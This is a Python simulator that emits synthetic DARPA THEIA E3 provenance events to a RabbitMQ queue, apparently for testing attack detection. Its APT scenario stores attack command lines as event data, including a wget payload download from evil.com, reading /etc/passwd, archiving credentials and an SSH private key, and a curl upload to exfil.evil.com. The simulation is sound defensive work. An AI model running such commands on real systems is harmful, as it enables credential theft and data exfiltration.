"""
DARPA THEIA E3 Dataset Simulator.

Generates synthetic CDM-format events that mimic the THEIA E3 dataset
and publishes them to RabbitMQ 'raw_events' queue.

Supports multiple attack scenarios:
  --scenario apt     : APT-style multi-stage attack (recon → exploit → exfil)
  --scenario benign  : Normal workstation activity
  --scenario mixed   : Benign background + injected attack

Usage:
  python main.py --scenario apt --rate 100 --duration 60
"""

import argparse
import json
import logging
import os
import random
import signal
import string
import time
import uuid as uuid_mod

import pika

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
)
logger = logging.getLogger("simulator")

# ── Config ────────────────────────────────────────────────────────────────

RABBITMQ_HOST = os.environ.get("RABBITMQ_HOST", "rabbitmq")
RABBITMQ_PORT = int(os.environ.get("RABBITMQ_PORT", "5672"))
RABBITMQ_USER = os.environ.get("RABBITMQ_USER", "guest")
RABBITMQ_PASS = os.environ.get("RABBITMQ_PASS", "guest")

EXCHANGE = "ophanim"
RAW_QUEUE = "raw_events"

running = True


def signal_handler(sig, frame):
    global running
    running = False


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ── UUID / CDM helpers ────────────────────────────────────────────────────


def new_uuid() -> str:
    return str(uuid_mod.uuid4())


def cdm_uuid(uid: str) -> dict:
    return {"com.bbn.tc.schema.avro.cdm20.UUID": uid}


def make_subject(uid: str, pid: int, cmdline: str, ppid_uuid: str = None) -> dict:
    """Create a CDM Subject datum (process)."""
    subj = {
        "uuid": uid,
        "type": "SUBJECT_PROCESS",
        "cid": pid,
        "cmdLine": {"string": cmdline},
        "localPrincipal": "1000",
    }
    if ppid_uuid:
        subj["parentSubject"] = cdm_uuid(ppid_uuid)
    return {"com.bbn.tc.schema.avro.cdm20.Subject": subj}


def make_file_object(uid: str, path: str) -> dict:
    """Create a CDM FileObject datum."""
    return {
        "com.bbn.tc.schema.avro.cdm20.FileObject": {
            "uuid": uid,
            "baseObject": {
                "properties": {
                    "map": {"path": path}
                }
            },
        }
    }


def make_netflow(uid: str, remote_addr: str, remote_port: int,
                 local_addr: str = "10.0.0.5", local_port: int = None) -> dict:
    """Create a CDM NetFlowObject datum."""
    return {
        "com.bbn.tc.schema.avro.cdm20.NetFlowObject": {
            "uuid": uid,
            "localAddress": local_addr,
            "localPort": local_port or random.randint(49152, 65535),
            "remoteAddress": remote_addr,
            "remotePort": remote_port,
        }
    }


def make_pipe(uid: str) -> dict:
    return {
        "com.bbn.tc.schema.avro.cdm20.UnnamedPipeObject": {
            "uuid": uid,
        }
    }


def make_event(event_type: str, subj_uuid: str, obj_uuid: str,
               timestamp_ns: int, size: int = None, name: str = None) -> dict:
    """Create a CDM Event datum."""
    evt = {
        "uuid": new_uuid(),
        "type": event_type,
        "timestampNanos": {"long": timestamp_ns},
        "subject": cdm_uuid(subj_uuid),
        "predicateObject": cdm_uuid(obj_uuid),
    }
    if size is not None:
        evt["size"] = {"long": size}
    if name:
        evt["name"] = {"string": name}
    return {"com.bbn.tc.schema.avro.cdm20.Event": evt}


# ── Scenarios ─────────────────────────────────────────────────────────────

# Benign process pool
BENIGN_PROCESSES = [
    ("/usr/bin/bash", "bash"),
    ("/usr/bin/python3", "python3 app.py"),
    ("/usr/sbin/sshd", "sshd: user@pts/0"),
    ("/usr/bin/vim", "vim config.yml"),
    ("/usr/bin/git", "git pull origin main"),
    ("/usr/bin/grep", "grep -r TODO src/"),
    ("/usr/bin/make", "make -j4"),
    ("/usr/bin/node", "node server.js"),
    ("/usr/lib/systemd/systemd-journald", "systemd-journald"),
    ("/usr/bin/cron", "cron"),
]

BENIGN_FILES = [
    "/home/user/project/src/main.py",
    "/home/user/project/config.yml",
    "/tmp/build_output.log",
    "/var/log/syslog",
    "/home/user/.bashrc",
    "/home/user/project/README.md",
    "/tmp/cache_data.tmp",
    "/home/user/project/requirements.txt",
]


def generate_benign_activity(base_ts: int) -> list[dict]:
    """Generate a burst of benign workstation activity."""
    datums = []
    ts = base_ts

    # Pick a random benign process
    exe, cmdline = random.choice(BENIGN_PROCESSES)
    proc_uuid = new_uuid()
    parent_uuid = new_uuid()

    # Parent process
    datums.append(make_subject(parent_uuid, random.randint(1, 5000), "/usr/bin/bash"))

    # Fork child
    datums.append(make_subject(proc_uuid, random.randint(5001, 65000), cmdline, parent_uuid))
    datums.append(make_event("EVENT_FORK", parent_uuid, proc_uuid, ts))
    ts += random.randint(100000, 5000000)  # 0.1-5ms

    # Execute
    exe_file = new_uuid()
    datums.append(make_file_object(exe_file, exe))
    datums.append(make_event("EVENT_EXECUTE", proc_uuid, exe_file, ts))
    ts += random.randint(1000000, 10000000)

    # Read some files
    for _ in range(random.randint(1, 3)):
        f_uuid = new_uuid()
        path = random.choice(BENIGN_FILES)
        datums.append(make_file_object(f_uuid, path))
        datums.append(make_event("EVENT_READ", proc_uuid, f_uuid, ts,
                                 size=random.randint(100, 50000)))
        ts += random.randint(500000, 5000000)

    # Maybe write a file
    if random.random() < 0.5:
        f_uuid = new_uuid()
        datums.append(make_file_object(f_uuid, f"/tmp/{random.choice(string.ascii_lowercase)}_out.txt"))
        datums.append(make_event("EVENT_WRITE", proc_uuid, f_uuid, ts,
                                 size=random.randint(50, 10000)))
        ts += random.randint(500000, 5000000)

    # Some open/close noise (will be filtered by normalizer)
    for _ in range(random.randint(0, 5)):
        f_uuid = new_uuid()
        datums.append(make_file_object(f_uuid, random.choice(BENIGN_FILES)))
        datums.append(make_event("EVENT_OPEN", proc_uuid, f_uuid, ts))
        ts += random.randint(100000, 1000000)
        datums.append(make_event("EVENT_CLOSE", proc_uuid, f_uuid, ts))
        ts += random.randint(100000, 1000000)

    return datums


def generate_apt_attack(base_ts: int) -> list[dict]:
    """
    Generate a multi-stage APT attack scenario:
      1. Initial access: wget downloads malicious payload
      2. Execution: bash executes payload
      3. Discovery: whoami, uname, cat /etc/passwd
      4. Lateral movement: ssh to another host
      5. Collection: tar + compress sensitive files
      6. Exfiltration: curl sends data to C2 server
    """
    datums = []
    ts = base_ts

    # ── Stage 1: Initial Access ──────────────────────────────────
    bash_uuid = new_uuid()
    datums.append(make_subject(bash_uuid, 1234, "/usr/bin/bash"))

    # wget downloads payload
    wget_uuid = new_uuid()
    datums.append(make_subject(wget_uuid, 1235, "wget http://evil.com/payload.sh", bash_uuid))
    datums.append(make_event("EVENT_FORK", bash_uuid, wget_uuid, ts))
    ts += 500000

    wget_exe = new_uuid()
    datums.append(make_file_object(wget_exe, "/usr/bin/wget"))
    datums.append(make_event("EVENT_EXECUTE", wget_uuid, wget_exe, ts))
    ts += 1000000

    # Connect to C2
    c2_socket = new_uuid()
    datums.append(make_netflow(c2_socket, "185.234.72.10", 443))
    datums.append(make_event("EVENT_CONNECT", wget_uuid, c2_socket, ts))
    ts += 50000000

    datums.append(make_event("EVENT_RECVFROM", wget_uuid, c2_socket, ts, size=45000))
    ts += 100000000

    # Write payload to disk
    payload_file = new_uuid()
    datums.append(make_file_object(payload_file, "/tmp/payload.sh"))
    datums.append(make_event("EVENT_WRITE", wget_uuid, payload_file, ts, size=45000))
    ts += 5000000

    # ── Stage 2: Execution ───────────────────────────────────────
    payload_proc = new_uuid()
    datums.append(make_subject(payload_proc, 1236, "/bin/bash /tmp/payload.sh", bash_uuid))
    datums.append(make_event("EVENT_FORK", bash_uuid, payload_proc, ts))
    ts += 500000

    bash_exe = new_uuid()
    datums.append(make_file_object(bash_exe, "/bin/bash"))
    datums.append(make_event("EVENT_EXECUTE", payload_proc, bash_exe, ts))
    ts += 1000000

    datums.append(make_event("EVENT_READ", payload_proc, payload_file, ts, size=45000))
    ts += 5000000

    # ── Stage 3: Discovery ───────────────────────────────────────
    for cmd, exe_path in [
        ("whoami", "/usr/bin/whoami"),
        ("uname -a", "/usr/bin/uname"),
        ("cat /etc/passwd", "/usr/bin/cat"),
        ("ip addr", "/usr/sbin/ip"),
        ("ps aux", "/usr/bin/ps"),
    ]:
        recon_uuid = new_uuid()
        datums.append(make_subject(recon_uuid, random.randint(1237, 1300), cmd, payload_proc))
        datums.append(make_event("EVENT_FORK", payload_proc, recon_uuid, ts))
        ts += 500000

        recon_exe = new_uuid()
        datums.append(make_file_object(recon_exe, exe_path))
        datums.append(make_event("EVENT_EXECUTE", recon_uuid, recon_exe, ts))
        ts += 2000000

        # Read sensitive files
        if "cat" in cmd:
            passwd_file = new_uuid()
            datums.append(make_file_object(passwd_file, "/etc/passwd"))
            datums.append(make_event("EVENT_READ", recon_uuid, passwd_file, ts, size=2048))
            ts += 1000000

        # Write to pipe (output)
        pipe = new_uuid()
        datums.append(make_pipe(pipe))
        datums.append(make_event("EVENT_WRITE", recon_uuid, pipe, ts, size=512))
        ts += 3000000

    # ── Stage 4: Lateral movement (SSH) ──────────────────────────
    ssh_uuid = new_uuid()
    datums.append(make_subject(ssh_uuid, 1310, "ssh user@10.0.0.20", payload_proc))
    datums.append(make_event("EVENT_FORK", payload_proc, ssh_uuid, ts))
    ts += 500000

    ssh_exe = new_uuid()
    datums.append(make_file_object(ssh_exe, "/usr/bin/ssh"))
    datums.append(make_event("EVENT_EXECUTE", ssh_uuid, ssh_exe, ts))
    ts += 5000000

    ssh_socket = new_uuid()
    datums.append(make_netflow(ssh_socket, "10.0.0.20", 22))
    datums.append(make_event("EVENT_CONNECT", ssh_uuid, ssh_socket, ts))
    ts += 10000000

    datums.append(make_event("EVENT_SENDTO", ssh_uuid, ssh_socket, ts, size=1024))
    ts += 5000000
    datums.append(make_event("EVENT_RECVFROM", ssh_uuid, ssh_socket, ts, size=2048))
    ts += 50000000

    # ── Stage 5: Collection ──────────────────────────────────────
    tar_uuid = new_uuid()
    datums.append(make_subject(tar_uuid, 1315, "tar czf /tmp/.data.tar.gz /home/user/docs/", payload_proc))
    datums.append(make_event("EVENT_FORK", payload_proc, tar_uuid, ts))
    ts += 500000

    tar_exe = new_uuid()
    datums.append(make_file_object(tar_exe, "/usr/bin/tar"))
    datums.append(make_event("EVENT_EXECUTE", tar_uuid, tar_exe, ts))
    ts += 2000000

    # Read multiple sensitive files
    for fname in ["/home/user/docs/credentials.txt", "/home/user/docs/database.conf",
                  "/home/user/docs/secrets.yml", "/home/user/.ssh/id_rsa"]:
        f = new_uuid()
        datums.append(make_file_object(f, fname))
        datums.append(make_event("EVENT_READ", tar_uuid, f, ts, size=random.randint(500, 5000)))
        ts += 2000000

    # Write archive
    archive = new_uuid()
    datums.append(make_file_object(archive, "/tmp/.data.tar.gz"))
    datums.append(make_event("EVENT_WRITE", tar_uuid, archive, ts, size=150000))
    ts += 10000000

    # ── Stage 6: Exfiltration ────────────────────────────────────
    curl_uuid = new_uuid()
    datums.append(make_subject(curl_uuid, 1320, "curl -X POST https://exfil.evil.com/upload -F data=@/tmp/.data.tar.gz", payload_proc))
    datums.append(make_event("EVENT_FORK", payload_proc, curl_uuid, ts))
    ts += 500000

    curl_exe = new_uuid()
    datums.append(make_file_object(curl_exe, "/usr/bin/curl"))
    datums.append(make_event("EVENT_EXECUTE", curl_uuid, curl_exe, ts))
    ts += 2000000

    # Read the archive
    datums.append(make_event("EVENT_READ", curl_uuid, archive, ts, size=150000))
    ts += 5000000

    # Connect to exfil server
    exfil_socket = new_uuid()
    datums.append(make_netflow(exfil_socket, "203.0.113.50", 443))
    datums.append(make_event("EVENT_CONNECT", curl_uuid, exfil_socket, ts))
    ts += 10000000

    # Send the data
    datums.append(make_event("EVENT_SENDTO", curl_uuid, exfil_socket, ts, size=150000))
    ts += 100000000

    # Receive confirmation
    datums.append(make_event("EVENT_RECVFROM", curl_uuid, exfil_socket, ts, size=256))
    ts += 5000000

    # ── Cleanup: delete payload ──────────────────────────────────
    rm_uuid = new_uuid()
    datums.append(make_subject(rm_uuid, 1325, "rm /tmp/payload.sh /tmp/.data.tar.gz", payload_proc))
    datums.append(make_event("EVENT_FORK", payload_proc, rm_uuid, ts))
    ts += 500000

    rm_exe = new_uuid()
    datums.append(make_file_object(rm_exe, "/usr/bin/rm"))
    datums.append(make_event("EVENT_EXECUTE", rm_uuid, rm_exe, ts))
    ts += 1000000

    datums.append(make_event("EVENT_UNLINK", rm_uuid, payload_file, ts))
    ts += 500000
    datums.append(make_event("EVENT_UNLINK", rm_uuid, archive, ts))

    return datums


# ── Real THEIA E3 data loader ─────────────────────────────────────────────

EVENT_KEY = "com.bbn.tc.schema.avro.cdm18.Event"


def iter_theia_file(data_file: str):
    """Yield (line_no, datum) pairs from a THEIA E3 JSON log file."""
    with open(data_file, "r", encoding="utf-8", errors="replace") as f:
        for line_no, raw in enumerate(f):
            raw = raw.strip()
            if not raw:
                continue
            try:
                obj = json.loads(raw)
            except json.JSONDecodeError:
                continue
            datum = obj.get("datum", obj)
            if not isinstance(datum, dict):
                continue
            yield line_no, datum


def run_theia_loader(channel, data_file: str, limit: int, rate: int, skip_events: int):
    """
    Stream real THEIA E3 datums from disk to the raw_events queue.

    If skip_events > 0 we fast-forward past the first N Event datums, but we
    still publish Subject/Object entity definitions from the skipped region
    so the ingest normalizer can resolve UUIDs referenced by later events.
    """
    logger.info(
        "Loading THEIA E3 data from %s (limit=%d, rate=%d/s, skip_events=%d)",
        data_file, limit, rate, skip_events,
    )
    total_sent = 0
    events_seen = 0
    events_sent = 0
    type_counts: dict[str, int] = {}
    start_time = time.time()

    def publish(datum):
        channel.basic_publish(
            exchange=EXCHANGE,
            routing_key="raw",
            body=json.dumps(datum),
            properties=pika.BasicProperties(
                delivery_mode=2,
                content_type="application/json",
            ),
        )

    for _line_no, datum in iter_theia_file(data_file):
        if not running:
            break

        is_event = EVENT_KEY in datum
        if is_event:
            events_seen += 1
            if events_seen <= skip_events:
                # Still in the skip window — drop this event but keep
                # walking so entity definitions are published.
                continue

        # Track the inner datum class for stats
        for k in datum.keys():
            type_counts[k] = type_counts.get(k, 0) + 1
            break

        publish(datum)
        total_sent += 1
        if is_event:
            events_sent += 1

        if rate > 0 and total_sent % rate == 0:
            time.sleep(1.0)

        if total_sent % 500 == 0:
            top = sorted(type_counts.items(), key=lambda kv: -kv[1])[:5]
            logger.info(
                "Sent %d datums (events=%d, %.1fs) — top types: %s",
                total_sent, events_sent, time.time() - start_time, top,
            )

        # The limit caps *events sent*, not total datums, so we don't run
        # out of budget on entity-definition noise.
        if limit > 0 and events_sent >= limit:
            break

    logger.info(
        "THEIA loader done: %d datums sent (events=%d, events_skipped=%d) in %.1fs",
        total_sent, events_sent, max(0, skip_events), time.time() - start_time,
    )
    logger.info("Datum type breakdown: %s", type_counts)


# ── Publisher ─────────────────────────────────────────────────────────────

def connect_rabbitmq() -> pika.BlockingConnection:
    credentials = pika.PlainCredentials(RABBITMQ_USER, RABBITMQ_PASS)
    params = pika.ConnectionParameters(
        host=RABBITMQ_HOST,
        port=RABBITMQ_PORT,
        credentials=credentials,
        heartbeat=600,
    )
    for attempt in range(30):
        try:
            conn = pika.BlockingConnection(params)
            logger.info("Connected to RabbitMQ")
            return conn
        except pika.exceptions.AMQPConnectionError:
            logger.warning("RabbitMQ not ready, retrying... (%d/30)", attempt + 1)
            time.sleep(2)
    raise RuntimeError("Could not connect to RabbitMQ")


def main():
    parser = argparse.ArgumentParser(description="THEIA E3 Event Simulator")
    parser.add_argument("--scenario", choices=["apt", "benign", "mixed", "theia"], default="mixed",
                        help="Attack scenario to simulate")
    parser.add_argument("--rate", type=int, default=50,
                        help="Events per second (approximate)")
    parser.add_argument("--duration", type=int, default=60,
                        help="Duration in seconds (0 = run forever)")
    parser.add_argument("--benign-ratio", type=int, default=10,
                        help="For mixed: benign bursts per attack cycle")
    parser.add_argument("--data-file", type=str, default="/data/theia.json",
                        help="Path to THEIA E3 JSON file (for --scenario theia)")
    parser.add_argument("--limit", type=int, default=5000,
                        help="Max Event datums to send from the THEIA file "
                             "(entity definitions don't count toward this)")
    parser.add_argument("--skip-events", type=int, default=0,
                        help="Fast-forward past the first N Event datums so we "
                             "jump over boot-time mmap/read storms. Entity "
                             "definitions in the skipped region are still "
                             "published so later events can resolve their UUIDs.")
    args = parser.parse_args()

    logger.info("=== THEIA E3 Simulator: scenario=%s rate=%d/s duration=%ds ===",
                args.scenario, args.rate, args.duration)

    conn = connect_rabbitmq()
    channel = conn.channel()
    channel.exchange_declare(exchange=EXCHANGE, exchange_type="direct", durable=True)
    channel.queue_declare(queue=RAW_QUEUE, durable=True)

    # Real DARPA THEIA E3 data replay short-circuits the synthetic loop
    if args.scenario == "theia":
        try:
            run_theia_loader(
                channel, args.data_file, args.limit, args.rate, args.skip_events
            )
        finally:
            conn.close()
        return

    base_ts = int(time.time() * 1_000_000_000)  # current time in nanoseconds
    total_sent = 0
    start_time = time.time()

    try:
        while running:
            elapsed = time.time() - start_time
            if args.duration > 0 and elapsed >= args.duration:
                break

            # Generate events based on scenario
            if args.scenario == "benign":
                datums = generate_benign_activity(base_ts)
            elif args.scenario == "apt":
                datums = generate_apt_attack(base_ts)
            elif args.scenario == "mixed":
                datums = []
                # Background benign activity
                for _ in range(args.benign_ratio):
                    datums.extend(generate_benign_activity(base_ts))
                    base_ts += random.randint(100_000_000, 1_000_000_000)
                # Inject attack
                datums.extend(generate_apt_attack(base_ts))

            # Publish all datums
            for datum in datums:
                channel.basic_publish(
                    exchange=EXCHANGE,
                    routing_key="raw",
                    body=json.dumps(datum),
                    properties=pika.BasicProperties(
                        delivery_mode=2,
                        content_type="application/json",
                    ),
                )
                total_sent += 1

                # Rate limiting
                if total_sent % args.rate == 0:
                    time.sleep(1.0)

            base_ts += 900_000_000_000  # advance 15 minutes in nanoseconds

            logger.info("Sent %d datums (elapsed: %.1fs)", total_sent, time.time() - start_time)

            # For apt/benign single-shot, just run once
            if args.scenario in ("apt", "benign"):
                break

    except KeyboardInterrupt:
        pass
    finally:
        conn.close()
        logger.info("Total datums sent: %d in %.1fs", total_sent, time.time() - start_time)


if __name__ == "__main__":
    main()
